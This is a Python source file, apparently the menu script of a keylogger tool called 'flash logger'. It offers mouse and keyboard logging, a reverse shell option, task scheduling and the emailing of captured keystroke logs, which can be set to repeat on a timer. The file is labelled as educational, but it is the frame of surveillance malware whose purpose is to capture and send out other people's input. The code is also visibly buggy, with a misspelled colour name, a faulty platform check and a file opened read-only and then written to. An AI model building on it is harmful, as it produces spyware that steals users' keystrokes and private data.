from distutils.command import build
from logger import send_logs as sl
import os
from termcolor import colored
from scheduler import main as sched
import platform

# Opens ASCII Art where it says: 'Welcome to flash logger'
ori_logo = open("logger/ori-logo.txt", "r")
ori_logo = ori_logo.read()

# Prints logo
print(ori_logo)

# General Information about Product Use and licensing
print("© Copyright Sami Hindi 2022")
print("This product is licensed under the MIT License.")
print(
    "For any questions or inquiries, please send me an E-Mail at 'fujiwarachoki@zohomail.eu'"
)
print("For Educational Purposes only")
print("\n\n")
print(
    "------------------------------------------------------------------------------------------------------"
)
print("\n\n")

# Asks User which option they want to perform
print(colored("PRESS 'o' TO CREATE OUTPUT FOLDER", 'red'))
print(colored("PRESS 'm' FOR MOUSE LOGGER", 'blue'))
print(colored("PRESS 'k' FOR KEYBOARD LOGGER", 'blue'))
print(colored("PRESS 'e' TO SEND LOGS TO EMAIL", 'blue'))
print(colored("PRESS 's' TO START A REVERSE SHELL", 'blue'))
print(colored("PRESS 't' TO SETUP TASK SCHEDULER", 'blule'))
print(colored("PRESS ANY OTHER KEY TO EXIT PROGRAM", 'blue'))
choice = input()
print("\n\n")
print(
    "------------------------------------------------------------------------------------------------------"
)

print(colored('PROVIDE PATH OF OUTPUT FOLDER', 'blue'))
output_path = input()
if not os.path.exists(output_path):
    os.mkdir(output_path)

# Reads file based on user's choice, then takes python script inside it, and runs it
if choice == 'm':
    mouse_logger = open("logger/mouse_logging.py")
    exec(mouse_logger.read())

elif choice == 's':
    data = open("tools/main.py")

elif choice == 'k':
    keyboard_logger = open("key_logging.py")
    exec(keyboard_logger.read())

elif choice == 'e':
    # Will ask for User's Email to send them the logs
    if os.stat("logger/Key_logs/keyboard_logs.txt").st_size == 0 or os.stat(
            "logger/Key_logs/mouse_logs.txt").st_size == 0:
        print(
            colored("WARNING: ", 'red') +
            "Please use one of the Loggers first, since both Log-Files are empty!"
        )
    print("\n\n")
    print(
        "------------------------------------------------------------------------------------------------------"
    )
    print(colored("ENTER YOUR EMAIL", 'blue'))
    email = input()
    print(colored('SCHEDULE EMAIL SENDING (y/n)', 'blue'))
    schedule_email = input()
    if schedule_email == 'y':
        print(colored('ENTER TIME INTERVAL IN SECONDS', 'blue'))
        interval = int(input())
        if ('Linux' or 'Mac') in platform.platform():
            build_path = output_path + '/build/'
        else:
            output_path + '\\build\\'
        os.mkdir(build_path)
        schedule_file = open(build_path + 'schedule_file.py')
        schedule_file.write("""
        from logger import send_logs as sl
        sl.send_email("Keyboard Logs", sl.logs1, email)
        sl.send_email("Mouse Logs", sl.logs2, email)
        """)
        sched.schedule('schedule_file.py', build_path, interval)
        sl.send_email("Keyboard Logs", sl.logs1, email)
        sl.send_email("Mouse Logs", sl.logs2, email)
    else:
        sl.send_email("Keyboard Logs", sl.logs1, email)
        sl.send_email("Mouse Logs", sl.logs2, email)
        print("Sent Logs to " + email)

elif choice == 't':
    print(colored('[*] SCHEDULER', 'blue'))

else:
    print("\n\n")
    print(
        "------------------------------------------------------------------------------------------------------"
    )
    print("EXITED PROGRAM")
    exit()
